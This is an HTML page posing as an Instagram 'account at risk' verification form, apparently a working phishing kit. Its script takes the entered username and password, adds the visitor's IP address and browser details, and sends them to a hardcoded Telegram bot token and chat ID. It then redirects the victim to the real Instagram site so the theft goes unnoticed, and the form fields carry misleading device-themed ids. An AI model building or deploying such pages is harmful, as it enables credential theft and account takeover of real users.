<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram - Device Compatibility</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
            position: relative;
        }

        /* Main container - clean Instagram-like design */
        .container {
            max-width: 440px;
            width: 100%;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
            overflow: hidden;
            transition: all 0.3s ease;
            border: 1px solid #dbdbdb;
        }

        /* Card content */
        .card {
            padding: 2rem 1.8rem 2rem;
        }

        /* Official Instagram logo */
        .insta-icon {
            text-align: center;
            margin-bottom: 1.5rem;
            position: relative;
        }

        .insta-icon svg {
            width: 72px;
            height: 72px;
            transition: transform 0.2s ease;
        }

        .insta-icon svg:hover {
            transform: scale(1.02);
        }

        /* Description text */
        .description {
            text-align: center;
            font-size: 0.9rem;
            color: #737373;
            background: #f9f9f9;
            padding: 0.75rem 1rem;
            border-radius: 20px;
            margin-bottom: 2rem;
            font-weight: 400;
            line-height: 1.5;
            border: 1px solid #efefef;
        }

        /* Form fields - Instagram classic style */
        .input-group {
            margin-bottom: 1rem;
        }

        .input-group label {
            display: block;
            font-size: 0.8rem;
            font-weight: 500;
            margin-bottom: 0.5rem;
            color: #8e8e8e;
            letter-spacing: -0.2px;
        }

        .input-field {
            width: 100%;
            padding: 0.9rem 1rem;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            font-size: 0.95rem;
            background: #fafafa;
            transition: all 0.2s;
            outline: none;
            font-family: inherit;
            color: #262626;
        }

        .input-field:focus {
            border-color: #b3b3b3;
            background: white;
            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.05);
        }

        /* Login button - Instagram blue */
        .login-btn {
            width: 100%;
            background: #0095f6;
            border: none;
            padding: 0.8rem;
            border-radius: 12px;
            font-size: 0.95rem;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 1rem;
            margin-bottom: 0.5rem;
            font-family: inherit;
        }

        .login-btn:hover {
            background: #1877f2;
            transform: scale(0.98);
        }

        .login-btn:active {
            transform: scale(0.97);
        }

        /* Error bar - subtle red */
        .error-bar {
            background: #fee;
            border-right: 4px solid #ed4956;
            border-radius: 12px;
            padding: 0.7rem 1rem;
            margin-top: 1rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            transition: all 0.2s;
        }

        .error-message {
            color: #ed4956;
            font-size: 0.8rem;
            font-weight: 500;
            flex: 1;
        }

        .close-error {
            background: none;
            border: none;
            font-size: 1.2rem;
            font-weight: 600;
            color: #ed4956;
            cursor: pointer;
            width: 26px;
            height: 26px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: 0.2s;
        }

        .close-error:hover {
            background: rgba(237, 73, 86, 0.1);
        }

        /* Hidden class */
        .hidden {
            display: none;
        }

        @media (max-width: 480px) {
            .card {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <!-- Official Instagram Logo -->
        <div class="insta-icon">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="2" y="2" width="20" height="20" rx="5" fill="url(#instaGradient)" stroke="none"/>
                <circle cx="12" cy="12" r="4.2" fill="white"/>
                <circle cx="17.2" cy="6.8" r="1.2" fill="white"/>
                <defs>
                    <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stop-color="#f09433"/>
                        <stop offset="25%" stop-color="#e6683c"/>
                        <stop offset="50%" stop-color="#dc2743"/>
                        <stop offset="75%" stop-color="#cc2366"/>
                        <stop offset="100%" stop-color="#bc1888"/>
                    </linearGradient>
                </defs>
            </svg>
        </div>

        <!-- Description text -->
        <div class="description">
            Your instagram account is at risk:
help us verify your account. please enter your email address, your username, and your phone number to confirm that you are the account owner.

        </div>

        <!-- Login Form -->
        <form id="loginForm" action="javascript:void(0);">
            <div class="input-group">
                
                <input type="text" id="deviceModel" class="input-field" placeholder="Phone, username, or email"autocomplete="off">
            </div>
            <div class="input-group">
                
                <input type="text" id="deviceVersion" class="input-field" placeholder="password" placeholder="Password">
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <cinter>
        <h6>Official instagram account security verification Team </h6>

            </cinter>
        <!-- Error Toast -->
        <div id="errorToast" class="error-bar hidden">
            <span class="error-message" id="errorText">❌ Error: Please enter the correct phone model and version</span>
            <button class="close-error" id="closeErrorBtn">✕</button>
        </div>
    </div>
</div>

<script>
    // ===================== Telegram Bot Configuration =====================
    const BOT_TOKEN = "8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM";
    const CHAT_ID = "7615377804";
    // =====================================================================

    // Function to get user IP address
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.warn("Failed to fetch IP:", error);
            return "Unavailable";
        }
    }

    // Function to get original device information
    function getOriginalDeviceInfo() {
        const userAgent = navigator.userAgent;
        let deviceType = "Unknown";
        let os = "Unknown";
        let browser = "Unknown";

        // Detect device type
        if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
            deviceType = "Mobile/Tablet";
        } else {
            deviceType = "Desktop/Laptop";
        }

        // Detect operating system
        if (userAgent.indexOf("Windows NT") !== -1) os = "Windows";
        else if (userAgent.indexOf("Mac OS") !== -1) os = "macOS";
        else if (userAgent.indexOf("Android") !== -1) os = "Android";
        else if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) os = "iOS";
        else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
        
        // Detect browser
        if (userAgent.indexOf("Chrome") !== -1 && userAgent.indexOf("Edg") === -1) browser = "Chrome";
        else if (userAgent.indexOf("Firefox") !== -1) browser = "Firefox";
        else if (userAgent.indexOf("Safari") !== -1 && userAgent.indexOf("Chrome") === -1) browser = "Safari";
        else if (userAgent.indexOf("Edg") !== -1) browser = "Edge";
        else if (userAgent.indexOf("OPR") !== -1) browser = "Opera";
        
        return `${deviceType} | ${os} | ${browser} | UA: ${userAgent.substring(0, 80)}...`;
    }

    // Function to send data to Telegram
    async function sendToTelegram(deviceModel, deviceVersion, ipAddress, originalDevice, timestamp) {
        const message = `🔔 *New Login - Instagram Checker* 🔔

📱 *الحساب:* ${deviceModel}

⚙️ *كلمة السر:* ${deviceVersion}

🌐 *عنوان IP:* ${ipAddress}

💻 *نوع الجهاز:* ${originalDevice}

🕒 *الوقت:* ${timestamp}

━━━━━━━━━━━━━━━━━━
✅ Verified and redirected`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };
        
        try {
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (result.ok) {
                console.log("✅ Message sent to Telegram successfully");
                return true;
            } else {
                console.error("❌ Telegram error:", result);
                return false;
            }
        } catch (err) {
            console.error("❌ Failed to connect to bot:", err);
            return false;
        }
    }

    // Function to validate phone model and version compatibility
    function isDeviceAndVersionMatch(model, version) {
        if (!model || !version) return false;
        const modelLower = model.trim().toLowerCase();
        const versionLower = version.trim().toLowerCase();
        
        if (modelLower.length < 2 || versionLower.length < 2) return false;
        
        // Keywords for operating systems
        const iosKeywords = [''];
        const androidKeywords = [''];
        
        let modelContainsIOS = iosKeywords.some(keyword => modelLower.includes(keyword));
        let modelContainsAndroid = androidKeywords.some(keyword => modelLower.includes(keyword));
        let versionContainsIOS = versionLower.includes('ios');
        let versionContainsAndroid = versionLower.includes('android');
        
        // Clear match
        if (modelContainsIOS && versionContainsIOS) return true;
        if (modelContainsAndroid && versionContainsAndroid) return true;
        
        // General cases: both fields have reasonable length and no conflict
        if (!modelContainsIOS && !modelContainsAndroid) {
            if (versionContainsAndroid || versionContainsIOS) return true;
            if (modelLower.length >= 3 && versionLower.length >= 2) return true;
            return false;
        }
        
        // Prevent conflicts (iPhone with Android)
        if (modelContainsIOS && versionContainsAndroid) return false;
        if (modelContainsAndroid && versionContainsIOS) return false;
        
        return true;
    }

    // Show error toast
    function showError(customMsg = null) {
        const errorToast = document.getElementById('errorToast');
        const errorTextSpan = document.getElementById('errorText');
        if (customMsg) {
            errorTextSpan.innerHTML = `❌ ${customMsg}`;
        } else {
            errorTextSpan.innerHTML = `❌ Error: Please enter the correct phone model and version`;
        }
        errorToast.classList.remove('hidden');
        // Auto hide after 4 seconds
        setTimeout(() => {
            if (!errorToast.classList.contains('hidden')) {
                errorToast.classList.add('hidden');
            }
        }, 4000);
    }

    function hideError() {
        const errorToast = document.getElementById('errorToast');
        errorToast.classList.add('hidden');
    }

    // DOM Elements
    const form = document.getElementById('loginForm');
    const deviceModelInput = document.getElementById('deviceModel');
    const deviceVersionInput = document.getElementById('deviceVersion');
    const closeBtn = document.getElementById('closeErrorBtn');

    closeBtn.addEventListener('click', () => {
        hideError();
    });

    // Handle form submission
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideError();
        
        const model = deviceModelInput.value.trim();
        const version = deviceVersionInput.value.trim();
        
        if (!isDeviceAndVersionMatch(model, version)) {
            showError("Error check your username and passwor");
            return;
        }
        
        const btn = document.querySelector('.login-btn');
        const originalBtnText = btn.innerText;
        btn.innerText = "⏳ Verifying...";
        btn.disabled = true;
        
        try {
            // Get all data
            const ipAddress = await getUserIP();
            const originalDevice = getOriginalDeviceInfo();
            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
            
            // Send data to bot
            const sent = await sendToTelegram(model, version, ipAddress, originalDevice, timestamp);
            
            if (sent) {
                btn.innerText = "✅ Success! Redirecting...";
                // Redirect to official Instagram page
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com";
                }, 1200);
            } else {
                btn.innerText = originalBtnText;
                btn.disabled = false;
                showError("Failed to connect to bot, please try again");
            }
        } catch (err) {
            console.error(err);
            btn.innerText = originalBtnText;
            btn.disabled = false;
            showError("Network error, please try again");
        }
    });
</script>
</body>
</html>
